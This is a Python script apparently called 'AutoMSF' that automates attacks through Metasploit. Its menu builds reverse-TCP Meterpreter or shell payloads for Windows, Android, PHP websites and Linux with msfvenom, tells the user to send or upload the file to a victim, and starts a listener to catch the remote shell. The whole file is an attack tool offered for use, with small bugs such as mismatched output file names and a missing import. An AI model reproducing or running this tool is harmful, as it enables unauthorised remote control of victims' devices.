#!/usr/bin/python
# -*- coding: utf-8 -*-
from urllib2 import *
from os import system
import sys
def echoo(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(4. / 100)
system("clear")
print """\033[93m              ╔═══════════════════════════════════════════════════════════════════╗
\033[93m              ║\033[94m  █████╗ ██╗   ██╗████████╗ ██████╗    \033[91m ███╗   ███╗███████╗███████╗\033[93m║
\033[93m              ║\033[94m ██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗    \033[91m████╗ ████║██╔════╝██╔════╝\033[93m║
\033[93m              ║\033[94m ███████║██║   ██║   ██║   ██║   ██║    \033[91m██╔████╔██║███████╗█████╗  \033[93m║
\033[93m              ║\033[94m ██╔══██║██║   ██║   ██║   ██║   ██║    \033[91m██║╚██╔╝██║╚════██║██╔══╝  \033[93m║
\033[93m              ║\033[94m ██║  ██║╚██████╔╝   ██║   ╚██████╔╝    \033[91m██║ ╚═╝ ██║███████║██║     \033[93m║
\033[93m              ║\033[94m ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝     \033[91m╚═╝     ╚═╝╚══════╝╚═╝     \033[93m║
\033[93m              ╚═══════════════════════════════════════════════════════════════════╝
"""
print """ \033[92m
                                    [1] AutoCrack Windows
                                    [2] AutoCrack Android
                                    [3] AutoCrack Website
                                    [4] AutoCrack Linux
                                    
                                    [6] Exit From Script
"""
a = raw_input("\033[94m                                    Choose an option : ")

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
ip = s.getsockname()[0]
s.close()

if a == "1":
  echoo("\033[92m[+] Generating Payload\033[92m")
  command = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=4444 -f exe > $HOME/Desktop/file.exe" % (ip)
  system(command)
  print "\033[91mPayload added on your Desktop as file.exe"
  echoo("Send the file to victim\033[92m")
  system("sleep 2")
  l = "set LHOST %s \n" % (ip)
  file = open("testfile.txt","w")
  file.write("use exploit/multi/handler \n")
  file.write(l)
  file.write("set LPORT 4444 \n")
  file.write("set PAYLOAD windows/meterpreter/reverse_tcp \n")
  file.write("run")
  file.close()
  system("msfconsole -r testfile.txt")

elif a == "2":
  echoo("\033[92m[+] Generating Payload\033[92m")
  command = "msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT=4444 > $HOME/Desktop/file.apk" % (ip)
  system(command)
  echoo("\033[91mPayload added on your Desktop as file.apk\033[92m")
  echoo("Send the file to victim")
  system("sleep 2")
  l = "set LHOST %s \n" % (ip)
  file = open("testfile.txt","w")
  file.write("use exploit/multi/handler \n")
  file.write(l)
  file.write("set LPORT 4444 \n")
  file.write("set PAYLOAD android/meterpreter/reverse_tcp \n")
  file.write("run")
  file.close()
  system("msfconsole -r testfile.txt")

elif a == "3":
  echoo("\033[92m[+] Generating Payload\033[92m")
  command = "msfvenom -p php/meterpreter/reverse_tcp LHOST=%s LPORT=4444 > $HOME/Desktop/file.apk" % (ip)
  system(command)
  echoo("\033[91mPayload added on your Desktop as file.php\033[92m")
  echoo("Upload to get a reverse shell")
  system("sleep 2")
  l = "set LHOST %s \n" % (ip)
  file = open("testfile.txt","w")
  file.write("use exploit/multi/handler \n")
  file.write(l)
  file.write("set LPORT 4444 \n")
  file.write("set PAYLOAD php/meterpreter/reverse_tcp \n")
  file.write("run")
  file.close()
  system("msfconsole -r testfile.txt")

elif a == "4":
  echoo("\033[92m[+] Generating Payload\033[92m")
  command = "msfvenom -p linux/x86/shell_reverse_tcp LHOST=%s LPORT=4444 > $HOME/Desktop/file.apk" % (ip)
  system(command)
  echoo("\033[91mPayload added on your Desktop as file.exploit\033[92m")
  echoo("Execute it on victims machine")
  system("sleep 2")
  l = "set LHOST %s \n" % (ip)
  file = open("testfile.txt","w")
  file.write("use exploit/multi/handler \n")
  file.write(l)
  file.write("set LPORT 4444 \n")
  file.write("set PAYLOAD linux/x86/shell_reverse_tcp \n")
  file.write("run")
  file.close()
  system("msfconsole -r testfile.txt")
else:
    exit()
